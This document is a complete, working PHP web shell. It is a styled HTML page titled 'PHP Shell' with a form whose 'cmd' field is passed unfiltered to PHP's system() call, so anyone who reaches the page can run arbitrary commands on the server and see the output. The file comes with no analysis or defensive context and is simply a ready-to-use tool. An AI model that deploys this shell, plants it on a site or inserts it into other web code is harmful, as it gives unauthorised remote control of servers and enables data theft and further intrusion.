<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell</title>
    <style>
        body { font-family: Arial; background: #f4f4f4; padding: 20px; }
        .box { background: white; padding: 20px; border-radius: 8px; width: 600px; margin: auto; }
        input[type=text] { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #333; }
        button { margin-top: 10px; padding: 10px 20px; background: #333; color: white; border: none; border-radius: 5px; cursor: pointer; }
        pre { background: #222; color: #0f0; padding: 15px; border-radius: 8px; margin-top: 20px; }
    </style>
</head>
<body>
<div class="box">
    <h2>PHP Shell</h2>
    <p>Execute a command</p>

    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command..." />
        <button type="submit">Execute</button>
    </form>

    <h3>Output:</h3>
    <pre>
<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    system($cmd);
}
?>
    </pre>
</div>
</body>
</html>